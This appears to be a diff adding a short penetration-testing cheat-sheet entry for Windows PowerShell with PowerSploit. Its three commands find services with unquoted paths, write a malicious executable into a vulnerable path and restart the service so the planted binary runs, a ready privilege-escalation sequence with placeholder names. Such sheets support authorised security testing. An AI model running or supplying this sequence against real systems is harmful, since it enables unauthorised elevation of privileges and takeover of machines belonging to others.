@@ -1,0 +1,8 @@
+% windows, pwsh, powersploit
+
+# check for unquoted service paths
+Get-UnquotedService
+
+# create malicious exe at unquoted service path
+Write-ServiceBinary -ServiceName <service_name> -Path <vulnerable_path>
+Restart-Service <service_name>
